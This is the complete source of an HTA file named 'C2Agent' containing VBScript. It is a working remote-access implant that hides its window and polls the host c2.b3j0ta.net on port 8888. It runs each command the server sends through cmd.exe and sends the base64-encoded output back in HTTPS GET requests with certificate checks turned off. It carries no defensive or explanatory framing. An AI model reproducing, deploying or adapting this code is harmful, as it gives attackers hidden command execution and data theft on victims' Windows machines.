<html>
<head>
<hta:application 
    id="oHTA" 
    applicationname="C2Agent" 
    showintaskbar="no" 
    caption="no" 
    innerborder="no" 
    selection="no" 
    scroll="no" 
    windowstate="minimize">
<script language="VBScript">
' Configurações
host = "c2.b3j0ta.net"
port = "8888"
url = "https://" & host & ":" & port & "/?arg="
GET_MAX_SIZE = 800

' Esconder a janela completamente
window.moveTo -2000, -2000
window.resizeTo 0, 0

Set ws = CreateObject("WScript.Shell")
cd = "."
contents = ""
cmdcount = 0
Dim commands()
base64codes = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

Function toUTF8(ByRef str, ByRef size)
    ReDim res(Len(str)*3)
    k=1
    For i = 1 To Len(str)
        ch = (AscW(Mid(str, i, 1))+65536) And 65535
        If (ch < 128) Then
            res(k) = ch: k=k+1
        ElseIf (ch < 2048) Then
            res(k) = 192 Or int(ch/64)
            res(k+1) = 128 Or (ch And 63): k=k+2
        Else
            res(k) = 224 Or (int(ch/4096) And 15)
            res(k+1) = 128 Or (int(ch/64) And 63)
            res(k+2) = 128 Or (ch And 63): k=k+3
        End If
    Next
    size = k-1: toUTF8 = res
End Function

Public Function Base64Encode(byVal strIn, ByVal special)
    n=1: cur=0: strOut=""
    data=toUTF8(strIn, size)
    if size < 1 then Base64Encode = "": Exit Function
    For i = 1 To size
        c=data(i)
        k = (n-1) Mod 3: bit = 4^(k+1)
        cur = cur + Int(c/bit)
        nex = int(((c And (bit-1))*64)/bit)
        strOut=strOut+Mid(base64codes, cur+1, 1)
        if k=2 or i=size Then strOut=strOut+Mid(base64codes, nex+1, 1): nex=0
        cur=nex: n=n+1
    Next
    if special then strOut=replace(strOut, "+", "_")
    Base64Encode = strOut
End Function

Sub MainLoop()
    On Error Resume Next
    if cmdcount > 0 And Len(contents) = 0 then
        cmd = commands(1)
        cmdcount = cmdcount - 1
        For x=1 To cmdcount: commands(x)=commands(x+1): Next
        ReDim Preserve commands(cmdcount)
        set cmdExec = ws.Exec("cmd /c cd /d " & cd & " && " & cmd & " && cd")
        out = cmdExec.StdOut.ReadAll
        lines = Split(out, vbCrLf)
        if UBound(lines) >= 0 then
            cd = lines(UBound(lines)-1)
            contents = Base64Encode(out, True) & "*"
        end if
    end if

    send_data = contents
    if send_data = "" then send_data = "L0FMSVZF" 
    
    Set req = CreateObject("WinHttp.WinHttpRequest.5.1")
    req.Open "GET", url & Mid(send_data, 1, GET_MAX_SIZE), False
    req.Option(4) = 0
    req.Send
    
    if Err.Number = 0 then
        if Len(contents) > 0 then contents = Mid(contents, GET_MAX_SIZE + 1)
        nextcmd = req.ResponseText
        if nextcmd <> "" then
            cmdcount = cmdcount + 1
            ReDim Preserve commands(cmdcount)
            commands(cmdcount) = nextcmd
        end if
    end if
    On Error Goto 0
    window.setTimeout "MainLoop", 2000
End Sub

MainLoop
</script>
</head>
<body style="background-color:transparent;border:none;">
</body>
</html>